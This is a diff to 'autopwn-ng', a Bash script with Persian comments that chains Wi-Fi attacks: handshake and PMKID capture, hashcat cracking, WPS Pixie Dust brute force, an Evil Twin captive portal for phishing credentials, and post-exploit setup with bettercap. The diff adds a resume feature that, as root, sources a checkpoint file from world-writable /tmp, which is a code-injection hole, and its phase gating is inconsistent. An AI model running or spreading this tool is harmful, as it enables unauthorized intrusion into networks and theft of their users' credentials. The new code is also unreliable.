@@ -3,7 +3,7 @@
 #  autopwn-ng — زنجیره کامل تست نفوذ وای‌فای
 #  استفاده: sudo autopwn-ng [-p profile] [-t seconds] [-i iface] [-w wordlist]
 #           [-d dictdir] [--no-wps] [--no-twin] [--no-post] [--target BSSID]
-#           [--auto] [--dry-run|--simulate]
+#           [--auto] [--resume] [--dry-run|--simulate]
 #  پروفایل: stealth | normal | brute
 # ==========================================================================
 set -uo pipefail
@@ -22,7 +22,9 @@ DO_POST=1
 TARGET=""
 DRY_RUN=0
 AUTO=0
+RESUME=0
 WLIMIT=3
+CHECKPOINT="/tmp/autopwn-ng.checkpoint"
 WORK="$(mktemp -d /tmp/autopwn.XXXXXX)"
 POT="$WORK/hashcat.pot"
 HASH="$WORK/targets.hc22000"
@@ -50,6 +52,7 @@ while [ $# -gt 0 ]; do
     --no-post) DO_POST=0; shift;;
     --dry-run|--simulate) DRY_RUN=1; shift;;
     --auto) AUTO=1; shift;;
+    --resume) RESUME=1; shift;;
     -h|--help) sed -n '2,8p' "$0"; exit 0;;
     *) err "گزینه ناشناس: $1"; exit 1;;
   esac
@@ -74,6 +77,45 @@ if [ "$AUTO" -eq 1 ]; then
   ok "حالت خودکار: اسکن + انتخاب هدف + کرک + گزارش"
 fi
 
+# ---------- تابع ذخیرهٔ checkpoint ----------
+save_checkpoint() {
+  local phase="$1"
+  {
+    printf 'CKPT_WORK=%q
+' "$WORK"
+    printf 'CKPT_PHASE=%d
+' "$phase"
+    printf 'CKPT_PROFILE=%q
+' "$PROFILE"
+  } > "$CHECKPOINT"
+}
+
+# ---------- حالت resume ----------
+SKIP_TO=0
+if [ "$RESUME" -eq 1 ]; then
+  if [ -f "$CHECKPOINT" ]; then
+    # shellcheck disable=SC1090
+    . "$CHECKPOINT"
+    if [ -n "${CKPT_WORK:-}" ] && [ -d "$CKPT_WORK" ]; then
+      WORK="$CKPT_WORK"
+      POT="$WORK/hashcat.pot"
+      HASH="$WORK/targets.hc22000"
+      CAP="$WORK/capture.pcapng"
+      REPORT="$WORK/report"
+      mkdir -p "$REPORT"
+      SKIP_TO=$(( ${CKPT_PHASE:-0} + 1 ))
+      ok "ادامه از فاز $SKIP_TO (آخرین فاز تکمیل‌شده: ${CKPT_PHASE:-0})"
+      ok "دایرکتوری کار: $WORK"
+    else
+      warn "دایرکتوری کار در checkpoint پیدا نشد؛ شروع از اول."
+      RESUME=0
+    fi
+  else
+    warn "فایل checkpoint پیدا نشد؛ شروع از اول."
+    RESUME=0
+  fi
+fi
+
 [ "$DRY_RUN" = 1 ] && {
   echo "SIMULATION MODE: autopwn-ng dry-run / --simulate"
   echo
@@ -81,6 +123,7 @@ fi
   echo "Capture: ${CAPTURE:-120}s"
   echo "Workload: $WLIMIT"
   [ "$AUTO" -eq 1 ] && echo "Mode: auto (one-click)"
+  [ "$RESUME" -eq 1 ] && echo "Mode: resume (skip to phase $SKIP_TO)"
   [ -n "$TARGET" ] && echo "Target: $TARGET"
   [ -n "$IFACE" ] && echo "Interface: $IFACE"
   [ -n "$WORDLIST" ] && echo "Wordlist: $WORDLIST"
@@ -206,15 +249,17 @@ if [ "$PROFILE" = stealth ]; then
 fi
 
 # ---------- فاز ۰.۵: شناسایی منفعل (kismet) ----------
-if command -v kismet >/dev/null 2>&1; then
+if [ "$SKIP_TO" -le 1 ] && command -v kismet >/dev/null 2>&1; then
   hr; c "فاز ۰.۵ — شناسایی منفعل با kismet"
   timeout 30 kismet -c "$MON" --daemonize 2>/dev/null || true
   sleep 10
   pkill -f kismet 2>/dev/null || true
   ok "شناسایی منفعل کامل شد."
+  save_checkpoint 1
 fi
 
 # ---------- فاز ۱: برداشت ----------
+if [ "$SKIP_TO" -le 2 ]; then
 hr; c "فاز ۱ — برداشت PMKID + EAPOL + EAP برای ${CAPTURE} ثانیه"
 HDR=$(hcxdumptool --help 2>&1 || true)
 if grep -q -- '--filterlist_ap' <<<"$HDR"; then
@@ -257,7 +302,11 @@ if command -v tshark >/dev/null 2>&1; then
   [ -s "$WORK/wps-bssids.txt" ] && ok "WPS BSSIDs: $(wc -l < "$WORK/wps-bssids.txt")"
 fi
 
+  save_checkpoint 2
+fi
+
 # ---------- فاز ۲: نرمال‌سازی ----------
+if [ "$SKIP_TO" -le 3 ]; then
 hr; c "فاز ۲ — استخراج و حذف تکراری"
 hcxpcapngtool -o "$WORK/raw.hc22000" -E "$WORK/essids.txt" \
   --eapmschapv2="$WORK/mschapv2.txt" "$CAP" > "$WORK/hcxtool.log" 2>&1
@@ -271,7 +320,11 @@ EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || echo 0)
 EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || echo 0)
 ok "PMKID: $PMKID_N | EAPOL: $EAPOL_N | Enterprise: $EAP_N"
 
+  save_checkpoint 3
+fi
+
 # ---------- فاز ۳: موتور کرک ----------
+if [ "$SKIP_TO" -le 4 ]; then
 hr; c "فاز ۳ — موتور کرک مرحله‌ای"
 
 build_dicts(){
@@ -375,8 +428,11 @@ if [ -s "$WORK/mschapv2.txt" ]; then
     >> "$WORK/enterprise-cracked.txt"
 fi
 
+  save_checkpoint 4
+fi
+
 # ---------- فاز ۴: WPS Pixie Dust + Brute ----------
-if [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; then
+if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; then
   hr; c "فاز ۴ — WPS (Pixie Dust + Brute)"
   # wash: اسکن دقیق WPS-enabled APها (بهتر از parsing CSV)
   if command -v wash >/dev/null 2>&1; then
@@ -414,7 +470,10 @@ if [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; then
   done < "$WORK/wps-cands.txt"
 fi
 
+  save_checkpoint 5
+
 # ---------- گزارش کرک ----------
+if [ "$SKIP_TO" -le 4 ]; then
 hr; c "استخراج نتایج"
 hashcat -m 22000 "$HASH" --show --potfile-path "$POT" 2>/dev/null > "$WORK/cracked-raw.txt"
 : > "$WORK/cracked.txt"
@@ -428,8 +487,10 @@ while IFS= read -r line; do
 done < "$WORK/cracked-raw.txt"
 [ -s "$WORK/enterprise-cracked.txt" ] && sed 's/^/ENTERPRISE|/' "$WORK/enterprise-cracked.txt" >> "$WORK/cracked.txt"
 
+fi
+
 # ---------- فاز ۵: Evil Twin ----------
-if [ "$DO_TWIN" -eq 1 ] && [ -n "$IFACE2" ] && ! [ -s "$WORK/cracked.txt" ]; then
+if [ "$SKIP_TO" -le 6 ] && [ "$DO_TWIN" -eq 1 ] && [ -n "$IFACE2" ] && ! [ -s "$WORK/cracked.txt" ]; then
   hr; c "فاز ۵ — Evil Twin + captive portal"
   if command -v hostapd-mana >/dev/null; then
     TGT="${TARGET:-$(awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x);print x; exit}' "$WORK/scan-01.csv")}"
@@ -461,8 +522,10 @@ EOF
   fi
 fi
 
+  save_checkpoint 6
+
 # ---------- فاز ۶: Post-exploit ----------
-if [ "$DO_POST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
+if [ "$SKIP_TO" -le 7 ] && [ "$DO_POST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
   hr; c "فاز ۶ — آماده‌سازی post-exploit"
   first=$(head -1 "$WORK/cracked.txt")
   b=$(cut -d'|' -f1 <<<"$first"); p=$(cut -d'|' -f2 <<<"$first")
@@ -484,7 +547,10 @@ EOF
   ok "اسکریپت اتصال + bettercap: $REPORT/connect.sh"
 fi
 
+  save_checkpoint 7
+
 # ---------- گزارش ----------
+if [ "$SKIP_TO" -le 8 ]; then
 hr
 {
   echo "# گزارش autopwn-ng"
@@ -517,4 +583,7 @@ if [ -s "$WORK/cracked.txt" ]; then
   c "گزارش: $REPORT/summary.md"
 else
   warn "کرک نشد. وردلیست بزرگ‌تر یا hashcat با GPU قوی‌تر لازم است."
+fi
+
+  save_checkpoint 8
 fi
